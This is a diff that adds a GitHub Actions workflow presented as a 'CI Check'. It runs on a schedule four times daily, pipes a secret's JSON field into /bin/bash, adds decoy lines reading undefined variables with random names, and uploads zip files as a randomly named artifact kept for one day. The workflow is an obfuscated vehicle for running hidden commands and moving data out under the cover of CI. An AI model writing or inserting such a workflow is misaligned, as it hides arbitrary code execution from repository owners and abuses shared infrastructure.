@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          wmhe1785: ${{ secrets.wmhe1785 }}
+        run: |
+          printf '%s' "$wmhe1785" | jq -r .alf40142 | /bin/bash
+          echo $zgmts07220 | jq -r .bef43 | /bin/bash
+          printf '%s' "$mmji9" | jq -r .cb9989 | /bin/bash
+          echo $hith6158 | jq -r .zwumi692 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: AgN6WQwG
+          path: "*.zip"
+          retention-days: 1
